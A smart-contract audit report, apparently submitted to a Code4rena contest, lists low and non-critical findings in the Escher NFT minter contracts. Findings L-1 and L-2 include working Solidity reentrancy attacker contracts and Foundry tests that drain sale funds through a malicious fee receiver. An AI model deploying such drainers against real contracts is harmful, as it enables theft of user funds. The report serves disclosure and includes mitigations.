# low

## L-1 `feeReceiver` can steal all funds in `OpenEdition` using reentrancy when `transfer` is changed to `call`

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L92

When this issue is fixed:

https://gist.github.com/Picodes/cd4ff52d400a1d060dcbd3d85b08b10f#l-2-unsafe-erc20-operations

calls to `finalize()` will be open to reentrancy attacks:

The `feeReceiver` in `OpenEditionFactory.sol` can be changed at any time:

```javascript
42:    function setFeeReceiver(address payable fees) public onlyOwner {
43:        feeReceiver = fees;
44:    }
```

If that is changed to a malicious contract the attacker can use reentrancy to empty the contract of funds:

`finalize()` in `OpenEdition.sol`
```javascript
89:    function finalize() public {
90:        Sale memory temp = sale;
91:        require(block.timestamp >= temp.endTime, "TOO SOON");
92:        ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20); // when this is changed to call it will be open for reentrancy
93:        _end(temp);
94:    }
```

### Impact
A malicious `feeReceiver` contract could use re-entry in `finalize()` to empty the contract of funds.

The seller has no control over who receives the fee and given all the issues with loss of keys lately the possibility of this attack  could affect the trust in the protocol.

### Proof of Concept
This requires that `call()` is used instead of `transfer()`, which is heavily recommended as the gas limit on `transfer()` could cause the contract to break down if a seller/feeReceiver uses a wallet or any kind of complex contract to receive their funds.

PoC in `OpenEdition.t.sol`:
```javascript
    function test_WhenEnded_FinalizeReentrancy() public {
        test_Buy();
        vm.warp(openSale.endTime);

        OpenEditionReentrancy feeReceiver = new OpenEditionReentrancy(address(sale));
        openSales.setFeeReceiver(payable(address(feeReceiver)));

        // 1 eth in contract
        console.log("openSales   ",address(sale).balance);

        sale.finalize();

        // attacker stole most eth
        console.log("attacker    ",address(feeReceiver).balance);
        // sales receiver should have 0.95 eth
        console.log("saleReceiver",address(69).balance);
    }
```

`OpenEditionReentrancy.sol`
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IOpenEdition {
    function finalize() external;
}

contract OpenEditionReentrancy {
    IOpenEdition private immutable openEdition;

    constructor(address _oe) {
        openEdition = IOpenEdition(_oe);
    }

    receive() external payable {
        // iterate sufficiently long to steal as much as possible
        while(address(openEdition).balance > 0.0001 ether) {
            openEdition.finalize();
        }
    }
}
```

### Tools Used
vscode, forge


### Recommended Mitigation Steps
I suggest using something like the OZ `ReentrancyGuard` for finalize calls.

## L-2 `feeReceiver` can steal all funds in `FixedPrice` using re-entry when `transfer` is changed to `call`

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPrice.sol#L109

When this issue is fixed:

https://gist.github.com/Picodes/cd4ff52d400a1d060dcbd3d85b08b10f#l-2-unsafe-erc20-operations

the final call to `_end()`, through `buy()` will be open to reentrancy attacks:

```javascript
107:    function _end(Sale memory _sale) internal {
108:        emit End(_sale);
109:        ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20); // when using call here, it will be possible to use reentrancy
110:        selfdestruct(_sale.saleReceiver);
111:    }
```

### Impact
A malicious `feeReceiver` contract could use re-entry in the `_end()`, through `buy()` call to empty the contract of funds.

The seller has no control over who receives the fee and given all the issues with loss of keys lately the possibility of this attack  could affect the trust in the protocol.

### Proof of Concept
This requires that `call()` is used instead of `transfer()`, which is heavily recommended as the gas limit on `transfer()` could cause the contract to break down if a seller/feeReceiver uses a wallet or any kind of complex contract to receive their funds.

When `call()` is used, a malicious `feeReceiver` contract could trigger the `_end()` code again by doing a `buy()` of zero NFTs:

```javascript
57:    function buy(uint256 _amount) external payable {
58:        Sale memory sale_ = sale;
59:        IEscher721 nft = IEscher721(sale_.edition);
60:        require(block.timestamp >= sale_.startTime, "TOO SOON");

           // since _amount = 0 no funds needs to be sent to execute this
61:        require(_amount * sale_.price == msg.value, "WRONG PRICE");

           // newId will not change as amount is 0
62:        uint48 newId = uint48(_amount) + sale_.currentId; 
63:        require(newId <= sale_.finalId, "TOO MANY");

...
           // newId will still equal sale_.finalId hence enter _end() again
73:        if (newId == sale_.finalId) _end(sale);
74:    }
```

PoC in `FixedPrice.t.sol`:
```javascript
    function test_WhenMintsOut_BuyReentrancy() public {
        test_Buy();
        
        FixedPriceReentrancy feeReceiver = new FixedPriceReentrancy(address(sale));
        fixedSales.setFeeReceiver(payable(address(feeReceiver)));

        sale.buy{value: 9 ether}(9);
        
        // feeReceiver stole most of the 10 eth
        console.log("feeReceiver ",address(feeReceiver).balance);
        // saleReceiver got almost nothing
        console.log("saleReceiver",address(69).balance);
    }
```

`FixedPriceReentrancy.sol`:
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IFixedPrice {
    function buy(uint256 amount) external;
}

contract FixedPriceReentrancy {
    IFixedPrice private immutable fixedPrice;

    constructor(address _fp) {
        fixedPrice = IFixedPrice(_fp);
    }

    receive() external payable {
        // iterate sufficiently long to steal as much as possible
        while(address(fixedPrice).balance > 0.0001 ether) {
            fixedPrice.buy(0);
        }
    }
}
```
### Tools Used
vscode, forge

### Recommended Mitigation Steps
Either use the OZ `ReentrancyGuard` on `buy()` or make it so that you cannot buy zero amount of NFTs to stop the exploit to be able to execute the `_end()` call multiple times.

## L-3 erroneously copy pasted comment

Comment copy pasted from `minters/FixedPrice.sol`. Should say the current type of action (LPDA or OpenEdition):

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L56

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L91

```javascript
File: minters/LPDA.sol

34:    /// @notice sale info for this fixed price edition

...

56:    /// @notice buy from a fixed price sale after the sale starts

...

91:    /// @notice cancel a fixed price sale
```

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L55

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L74

```javascript
File: minters/OpenEdition.sol

25:    /// @notice sale info for this fixed price edition

...

55:    /// @notice buy from a fixed price sale after the sale starts

...

74:    /// @notice cancel a fixed price sale
```

## L-4 incorrect comment

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPrice.sol#L84

Comment refers to `cancel()` but is present above the `getPrice()` too.

```javascript
File: minters/FixedPrice.sol

84:    /// @notice cancel a fixed price sale
85:    /// @notice the price of the sale
86:    function getPrice() public view returns (uint256) {
87:        return sale.price;
88:    }
```

## L-5 anyone can call `initialize()`

in the minters contracts the `factory` is already stored in the constructor so it can be verified that only the factory is allowed to call initialize.

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPrice.sol#L78

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L110

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L82

```javascript
File: FixedPrice.sol

78:    function initialize(Sale memory _sale) public initializer {
79:        sale = _sale;
80:        _transferOwnership(_sale.saleReceiver);
81:        emit Start(_sale);
82:    }
```

And in `Escher721.sol` the factory can be stored by the constructor to do the same validation:

https://github.com/code-423n4/2022-12-escher/blob/main/src/Escher721.sol#L32

# non-crit

## NC-1 whale cannot buy for more than 1.5 billion USD

max `uint80` is 1208925 eth which at current rate is about 1.5 billion USD

```javascript
File: minters/LPDA.sol

31:        uint80 balance;
```

instead of having `uint48` as max for the amount you can buy, you can use some more bits for balance and less for amount. Like `uint32` for amount still lets you buy 4 billion NFTs, but you can then use `uint96` for balance 

## NC-2 no events emitted when feeReceiver changes

Events help to track important changes:

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPriceFactory.sol#L42-L44


```javascript
File: minters/FixedPriceFactory.sol

42:    function setFeeReceiver(address payable fees) public onlyOwner {
43:        feeReceiver = fees;
44:    }
```

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDAFactory.sol#L46-L48
```javascript
File: minters/LPDAFactory.sol

46:    function setFeeReceiver(address payable fees) public onlyOwner {
47:        feeReceiver = fees;
48:    }
```

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEditionFactory.sol#L42-L44
```javascript
File: minters/LPDAFactory.sol

42:    function setFeeReceiver(address payable fees) public onlyOwner {
43:        feeReceiver = fees;
44:    }
```
